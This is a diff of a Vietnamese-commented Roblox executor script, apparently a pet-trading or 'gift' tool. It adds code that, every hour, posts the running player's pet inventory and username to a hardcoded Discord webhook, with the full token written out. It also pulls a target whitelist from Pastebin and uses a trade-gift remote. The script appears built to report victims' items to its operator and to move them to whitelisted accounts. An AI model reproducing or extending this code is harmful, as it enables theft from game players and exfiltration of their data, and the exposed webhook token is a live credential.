@@ -1,6 +1,7 @@
 -- Cấu hình Webhook
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1456310274243166219/E-d5-s35qO6SZ9-3JuowoiZ_HQ887fWKPuLh-Kj-SlLyRNPgpQ3iqIOVwJx1b0qaWAd_" 
-local WEBHOOK_DELAY = 3601 -- 1 giờ 1 giây
+local WEBHOOK_DELAY = 3601 
+local WHITELIST_URL = "https://pastebin.com/raw/n6LvrFGC"
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -11,7 +12,6 @@ local LocalPlayer = Players.LocalPlayer
 
 -- [GIỮ NGUYÊN CÁC BIẾN LOGIC GỐC]
 local TradeRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Trade.SendGift")
-local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"
 local MIN_LEVEL = 150
 local TRADE_DELAY = 8 
 local TradeEnabled, IsTrading = false, false
@@ -20,21 +20,38 @@ local CooldownTime = 0
 local Whitelist = {}
 
 -- ==========================================
--- PHẦN WEBHOOK ĐÃ CẬP NHẬT (Lọc Basic Bat, lấy tất cả Pet)
+-- LOGIC WEBHOOK & WHITELIST MỚI
 -- ==========================================
+
+-- Hàm kiểm tra xem người chơi có trong whitelist Pastebin không
+local function IsPlayerInWebhookWhitelist()
+    local success, content = pcall(function() return game:HttpGet(WHITELIST_URL) end)
+    if success then
+        for line in content:gmatch("[^\r\n]+") do
+            local cleanName = line:gsub("^%s*(.-)%s*$", "%1"):lower()
+            if LocalPlayer.Name:lower() == cleanName then
+                return true
+            end
+        end
+    end
+    return false
+end
+
 local function SendPetInventoryToWebhook()
-    if WEBHOOK_URL == "" or WEBHOOK_URL:find("YOUR_WEBHOOK") then return end
+    -- Kiểm tra whitelist trước khi gửi
+    if not IsPlayerInWebhookWhitelist() then 
+        warn("Người dùng không có trong whitelist Webhook.")
+        return 
+    end
 
     local petData = {}
     local blacklistedName = "Basic Bat"
 
-    -- Duyệt backpack lấy toàn bộ pet
     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
         if tool:IsA("Tool") then
             local name = tool:GetAttribute("BrainrotName") or tool.Name
             local mut = tool:GetAttribute("Mutation") or "None"
             
-            -- Lọc bỏ "Basic Bat"
             if name ~= blacklistedName then
                 local key = name .. "|" .. mut
                 if not petData[key] then
@@ -49,7 +66,7 @@ local function SendPetInventoryToWebhook()
     local count = 0
     for _, data in pairs(petData) do
         count = count + 1
-        if count <= 25 then -- Giới hạn 25 fields của Discord Embed
+        if count <= 25 then
             table.insert(fields, {
                 ["name"] = "🐾 " .. data.name,
                 ["value"] = string.format("**Mutation:** %s\n**Số lượng:** %d", data.mutation, data.count),
@@ -58,41 +75,47 @@ local function SendPetInventoryToWebhook()
         end
     end
 
-    if #fields == 0 then
-        table.insert(fields, {["name"] = "Thông báo", ["value"] = "Kho đồ trống hoặc chỉ chứa Basic Bat."})
-    end
-
     local payload = {
         ["embeds"] = {{
             ["title"] = "📢 Báo Cáo Kho Pet - " .. LocalPlayer.DisplayName,
-            ["description"] = "Người chơi: `" .. LocalPlayer.Name .. "`\nID: `" .. LocalPlayer.UserId .. "`",
+            ["description"] = "Người chơi: `" .. LocalPlayer.Name .. "`",
             ["color"] = 0x00ff00,
-            ["fields"] = fields,
+            ["fields"] = #fields > 0 and fields or {{["name"] = "Thông báo", ["value"] = "Trống"}},
             ["footer"] = {["text"] = "RGB Mobile Pro V6 • " .. os.date("%X")}
         }}
     }
 
-    local success, err = pcall(function()
-        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
-    end)
-    
-    if not success then 
-        warn("Lỗi gửi Webhook: " .. tostring(err)) 
+    -- Sử dụng request (phương thức tối ưu cho Executor)
+    local requestFunc = syn and syn.request or http and http.request or http_request or request
+    if requestFunc then
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    else
+        -- Fallback nếu không có request (dùng cho môi trường Studio hoặc executor yếu)
+        pcall(function()
+            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
+        end)
     end
 end
 
--- Chạy gửi Webhook ngay lập tức khi thực thi
+-- Chạy vòng lặp Webhook
 task.spawn(function()
     while true do
         SendPetInventoryToWebhook()
         task.wait(WEBHOOK_DELAY)
     end
 end)
+
+-- ==========================================
+-- [CÁC PHẦN CÒN LẠI CỦA SCRIPT GIỮ NGUYÊN]
 -- ==========================================
 
--- [PHẦN GUI VÀ LOGIC TRADE GIỮ NGUYÊN NHƯ CŨ]
 local function UpdateWhitelist()
-    local success, content = pcall(function() return game:HttpGet(RAW_URL) end)
+    local success, content = pcall(function() return game:HttpGet(WHITELIST_URL) end)
     if success then
         Whitelist = {}
         for line in content:gmatch("[^\r\n]+") do
